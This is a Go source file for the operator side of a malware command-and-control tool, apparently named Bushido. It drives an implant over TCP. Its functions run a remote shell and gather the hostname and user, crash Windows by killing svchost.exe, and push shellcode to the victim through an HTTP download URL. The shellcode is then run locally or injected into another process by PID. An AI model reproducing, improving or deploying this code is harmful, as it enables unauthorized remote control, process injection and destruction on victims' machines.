package cmd

import (
	"bufio"
	"fmt"
	"net"
	"os"
	"os/exec"
	"regexp"
	"strings"
	"time"

	"github.com/D3Ext/maldev/logging"
)

// Server-Sides needs to handle errors better
func shell(conn *net.Conn) { //Test cd and pwd. They work almost flawlessly.
	reader := bufio.NewReader(os.Stdin)
L: //Labeled the for loop with L if i need to break it from switch. Faster than if statements. Works.
	for {
		fmt.Print(logging.SBlue("PS > "))
		command, err := reader.ReadString('\n')
		if err != nil {
			fmt.Println("[-]Error reading input:", err)
			continue
		}
		command = strings.TrimSpace(command)
		cdRegex := regexp.MustCompile(`cd .+`)
		cdRegexComp := cdRegex.FindString(command)
		if cdRegexComp != "" {
			dir2Go := strings.Split(command, " ")[1]
			cd(conn, dir2Go)
			continue
		}
		switch command {
		case "":
			continue
		case "cls":
			continue
		case "bg":
			break L
		case "exit":
			break L
		case "pwd":
			pwd(conn)
		default:
			(*conn).Write([]byte(command))
			request := make([]byte, 9000)
			read_len, err := (*conn).Read(request)
			if read_len == 0 {
				fmt.Println("[-]Read Length is 0")
				//(*conn).Close()
				return
			}
			if err != nil {
				//(*conn).Close()
				return
			}
			reply := string(request[:read_len])
			fmt.Println(reply)
		}
	}
}

func hostinfo(conn *net.Conn) (string, string) {
	fmt.Println()
	(*conn).Write([]byte("hostname\n"))
	request := make([]byte, 9000)
	read_len, err := (*conn).Read(request)
	if read_len == 0 {
		fmt.Println("[-]Read Length is 0")
		return "ERROR", "ERROR"
	}
	if err != nil {
		fmt.Println("[-]Error with reading from buffer")
		return "ERROR", "ERROR"
	}
	hostname := string(request[:read_len])
	(*conn).Write([]byte("whoami\n"))
	read_len, err = (*conn).Read(request)
	if read_len == 0 {
		fmt.Println("[-]Read Length is 0")
		return "ERROR", "ERROR"
	}
	if err != nil {
		fmt.Println("[-]Error with reading from buffer")
		return "ERROR", "ERROR"
	}
	whoami := string(request[:read_len])
	return hostname, whoami
}

func bsod(conn *net.Conn) bool { //Works but implant should be running as admin
	fmt.Println("[!]Initiating BSOD by killing svchost.exe")
	(*conn).Write([]byte("SelfDestruct\n"))
	fmt.Println("[+]Kill Signal Sent")
	reply := make([]byte, 9000)
	(*conn).SetReadDeadline(time.Now().Add(15 * time.Second))

	read_len, err := (*conn).Read(reply)
	if read_len == 0 {
		(*conn).Close()
		return true
	}
	if err != nil {
		(*conn).Close()
		return true
	}
	strReply := string(reply[:read_len])
	if strReply == "NoTime2Die\n" {
		fmt.Println(strReply)
		return false
	}
	return true
}

// func playAudio(conn *net.Conn, audioFile string) {
// 	fmt.Println("Playing audio on the remote host :)")
// 	contents, err := os.ReadFile("Audio/" + audioFile)
// 	if err != nil {
// 		fmt.Println("Couldn't read the file !")
// 		return
// 	}
// 	(*conn).Write([]byte("play\n"))
// 	(*conn).Write(contents)
// }

// V1
func ls(conn *net.Conn) { //Limit the size of the data sent over the client because it desyncs everything on server end.
	(*conn).Write([]byte("ls\n"))
	request := make([]byte, 99999999) //This looks reasonable. 99MB maybe a bit too much but this should be more than fine for ridiculously large dirs
	read_len, err := (*conn).Read(request)
	if read_len == 0 {
		(*conn).Close()
		fmt.Println("Error")
		return
	}
	if err != nil {
		(*conn).Close()
		fmt.Println("Error")
		return
	}
	reply := string(request[:read_len])
	fmt.Println("\n" + "	SIZE(KB)		" + "MODE		" + "	NAME" + "\n" +
		"	--------		" + "-----		" + "	-----" + "\n" + reply + "\n")
}

// V2
// func ls(conn *net.Conn) {
// 	(*conn).Write([]byte("ls\n")) // Initial request

// 	chunk := make([]byte, 1024) // Smaller buffer for reading chunks
// 	fullListing := ""

// 	for {
// 		readLen, err := (*conn).Read(chunk)
// 		if err != nil || readLen == 0 {
// 			(*conn).Close()
// 			fmt.Println("Error receiving data")
// 			return
// 		}

// 		reply := string(chunk[:readLen])

// 		// If "END" is received, the transfer is complete
// 		if reply == "END" {
// 			break
// 		}

// 		// Append received chunk to the full directory listing
// 		fullListing += reply

// 		// Send acknowledgment to client after receiving each chunk
// 		(*conn).Write([]byte("ACK\n"))
// 	}

// 	fmt.Println("\n" + "	SIZE(KB)		" + "MODE		" + "	NAME" + "\n" +
// 		"	--------		" + "-----		" + "	-----" + "\n" + fullListing + "\n")
// }

// //V3
// func ls(conn *net.Conn) {
// 	(*conn).Write([]byte("ls\n")) // Send command to client

// 	chunk := make([]byte, 1024) // Buffer for receiving chunks
// 	fullListing := ""

// 	for {
// 		readLen, err := (*conn).Read(chunk)
// 		if err != nil {
// 			(*conn).Close()
// 			fmt.Println("Error receiving data: ", err)
// 			return
// 		}

// 		reply := string(chunk[:readLen])

// 		// If "END" is received, the transfer is complete
// 		if reply == "END" {
// 			break
// 		}

// 		// Append received chunk to the full directory listing
// 		fullListing += reply

// 		// Send acknowledgment to client after receiving each chunk
// 		_, writeErr := (*conn).Write([]byte("ACK\n"))
// 		if writeErr != nil {
// 			fmt.Println("Error sending ACK: ", writeErr)
// 			(*conn).Close()
// 			return
// 		}
// 	}

// 	// Print the full directory listing
// 	fmt.Println("\n" + "	SIZE(KB)		" + "MODE		" + "	NAME" + "\n" +
// 		"	--------		" + "-----		" + "	-----" + "\n" + fullListing + "\n")
// }

func cd(conn *net.Conn, dir2go string) {
	//fmt.Println(dir2go)
	(*conn).Write([]byte("cd\n"))
	buffer := make([]byte, 100)
	read_len, err := (*conn).Read(buffer)
	if err != nil {
		fmt.Println("[-]Error Reading From Buffer")
		return
	}
	if read_len <= 1 {
		fmt.Println("[-]Error with length of Buffer")
		return
	}
	(*conn).Write([]byte(dir2go))
	read_len, err = (*conn).Read(buffer)
	if err != nil {
		fmt.Println("[-]Error Reading From Buffer")
		return
	}
	if read_len <= 1 {
		fmt.Println("[-]Error with length of Buffer")
		return
	}
	bufferSnapped := buffer[:read_len]
	strBuffer := string(bufferSnapped)
	if strBuffer != "OK\n" {
		fmt.Println("ERROR")
	}
}

func pwd(conn *net.Conn) {
	(*conn).Write([]byte("pwd\n"))
	request := make([]byte, 99999)
	read_len, err := (*conn).Read(request)
	if read_len == 0 {
		(*conn).Close()
		fmt.Println("Error")
		return
	}
	if err != nil {
		(*conn).Close()
		fmt.Println("Error")
		return
	}
	reply := string(request[:read_len])
	fmt.Println()
	fmt.Println(reply)
	fmt.Println()
}

// This transmits over tcp. Will make one that uses http server
// func load(conn *net.Conn, fileWShellcode string) {
// 	fmt.Println()
// 	fmt.Println("[!]Local File Path:" + fileWShellcode)
// 	file, err := os.ReadFile(fileWShellcode)
// 	if err != nil {
// 		fmt.Println("[-]Couldn't read the file on the local machine !")
// 		return
// 	}
// 	fmt.Println("[*]Sending Signal ...")
// 	(*conn).Write([]byte("barCode\n"))
// 	buffer := make([]byte, 10000000)
// 	read_len, err := (*conn).Read(buffer)
// 	if err != nil {
// 		fmt.Println("[-]Error Reading From Buffer")
// 		return
// 	}
// 	if read_len <= 1 {
// 		fmt.Println("[-]Error with length of Buffer")
// 		return
// 	}
// 	bufferSnapped := buffer[:read_len]
// 	bufferStr := string(bufferSnapped)
// 	if bufferStr != "OK\n" {
// 		fmt.Println("[-]Couldn't initate CreateThread")
// 		return
// 	}
// 	fmt.Println("[+]Signal was recieved and acknowledged")

// 	fmt.Println("[*]Sending shellcode")
// 	(*conn).Write(file)
// 	read_len, err = (*conn).Read(buffer)
// 	if err != nil {
// 		fmt.Println("[-]Error Reading From Buffer")
// 		return
// 	}
// 	if read_len <= 1 {
// 		fmt.Println("[-]Error with length of Buffer")
// 		return
// 	}
// 	bufferSnapped = buffer[:read_len]
// 	bufferStr = string(bufferSnapped)
// 	if bufferStr != "OK\n" {
// 		fmt.Println("[-]Couldn't send the shellcode")
// 	}
// 	fmt.Println("[+]Shellcode sent successfully !")
// }

func load(conn *net.Conn, fileWShellcode string) {
	fmt.Println()
	fmt.Println("[!]Local File Path: " + fileWShellcode)
	file, err := os.Stat(fileWShellcode)
	if err != nil {
		fmt.Println("[-]Couldn't read the file on the local machine !")
		return
	}
	fmt.Println("[*]Sending Signal ...")
	(*conn).Write([]byte("barCode\n"))
	buffer := make([]byte, 100)
	read_len, err := (*conn).Read(buffer)
	if err != nil {
		fmt.Println("[-]Error Reading From Buffer")
		return
	}
	if read_len <= 1 {
		fmt.Println("[-]Error with length of Buffer")
		return
	}
	bufferSnapped := buffer[:read_len]
	bufferStr := string(bufferSnapped)
	if bufferStr != "OK\n" {
		fmt.Println("[-]Couldn't initate CreateThread")
		return
	}
	fmt.Println("[+]Signal was recieved and acknowledged")
	localAddress := (*conn).LocalAddr().String()
	localIP := strings.Split(localAddress, ":")[0]
	//Since we hard coded it to be 8080 the port we listen on we do the folowing
	downloadURL := "http://" + localIP + ":8080/" + file.Name()
	(*conn).Write([]byte(downloadURL))
	read_len, err = (*conn).Read(buffer)
	if err != nil {
		fmt.Println("[-]Error Reading From Buffer")
		return
	}
	if read_len <= 1 {
		fmt.Println("[-]Error with length of buffer")
		return
	}
	bufferSnapped = buffer[:read_len]
	bufferStr = string(bufferSnapped)
	if bufferStr != "OK\n" {
		fmt.Println("[-]URL did not send")
		return
	}
	fmt.Println("[+]Download URL sent successfully !")
	fmt.Println("[*]Started python HTTP Server in Bushido dir")
	fmt.Println("[!]Manually terminate the HTTP server after the client recieves the shellcode !")
	cmd := exec.Command("./scripts/pythonServer.sh")
	cmd.Run()
	read_len, err = (*conn).Read(buffer)
	if err != nil {
		fmt.Println("[-]Error Reading From Buffer")
		return
	}
	if read_len <= 1 {
		fmt.Println("[-]Error with length of buffer")
		return
	}
	//(*conn).SetReadDeadline(10 * time.Second)
	bufferSnapped = buffer[:read_len]
	bufferStr = string(bufferSnapped)
	if bufferStr != "OK\n" {
		fmt.Println("[-]Something went wrong")
		return
	}
	fmt.Println("[+]Successful Loading !")
	fmt.Println()
}

// Continue this later
func remoteThread(conn *net.Conn, fileWShellcode string, pid string) {
	fmt.Println()
	fmt.Println("[!]Local File Path: " + fileWShellcode)
	file, err := os.Stat(fileWShellcode)
	if err != nil {
		fmt.Println("[-]Couldn't read the file on the local machine !")
		return
	}
	fmt.Println("[*]Sending Signal ...")
	(*conn).Write([]byte("remote\n"))
	buffer := make([]byte, 100)
	read_len, err := (*conn).Read(buffer)
	if err != nil {
		fmt.Println("[-]Error Reading From Buffer")
		return
	}
	if read_len <= 1 {
		fmt.Println("[-]Error with length of Buffer")
		return
	}
	bufferSnapped := buffer[:read_len]
	bufferStr := string(bufferSnapped)
	if bufferStr != "OK\n" {
		fmt.Println("[-]Couldn't initate CreateRemoteThread")
		return
	}
	fmt.Println("[+]Signal was recieved and acknowledged")
	localAddress := (*conn).LocalAddr().String()
	localIP := strings.Split(localAddress, ":")[0]
	//Since we hard coded it to be 8080 the port we listen on we do the folowing
	downloadURL := "http://" + localIP + ":8080/" + file.Name()
	(*conn).Write([]byte(downloadURL))
	read_len, err = (*conn).Read(buffer)
	if err != nil {
		fmt.Println("[-]Error Reading From Buffer")
		return
	}
	if read_len <= 1 {
		fmt.Println("[-]Error with length of buffer")
		return
	}
	bufferSnapped = buffer[:read_len]
	bufferStr = string(bufferSnapped)
	if bufferStr != "OK\n" {
		fmt.Println("[-]URL did not send")
		return
	}
	fmt.Println("[+]Download URL sent successfully !")
	fmt.Println("[*]Sending PID ...")
	(*conn).Write([]byte(pid))
	read_len, err = (*conn).Read(buffer)
	if err != nil {
		fmt.Println("[-]Error Reading From Buffer")
		return
	}
	if read_len <= 1 {
		fmt.Println("[-]Error with length of buffer")
		return
	}
	bufferSnapped = buffer[:read_len]
	bufferStr = string(bufferSnapped)
	if bufferStr != "OK\n" {
		fmt.Println("[-]PID did not send")
		return
	}
	fmt.Println("[*]Started python HTTP Server in Bushido dir")
	fmt.Println("[!]Manually terminate the HTTP server after the client recieves the shellcode !")
	cmd := exec.Command("./scripts/pythonServer.sh")
	cmd.Run()
	read_len, err = (*conn).Read(buffer)
	if err != nil {
		fmt.Println("[-]Error Reading From Buffer")
		return
	}
	if read_len <= 1 {
		fmt.Println("[-]Error with length of buffer")
		return
	}
	//(*conn).SetReadDeadline(10 * time.Second)
	bufferSnapped = buffer[:read_len]
	bufferStr = string(bufferSnapped)
	if bufferStr != "OK\n" {
		fmt.Println("[-]Something went wrong")
		return
	}
	fmt.Println("[+]Successful Proccess Injection !")
	fmt.Println()
}
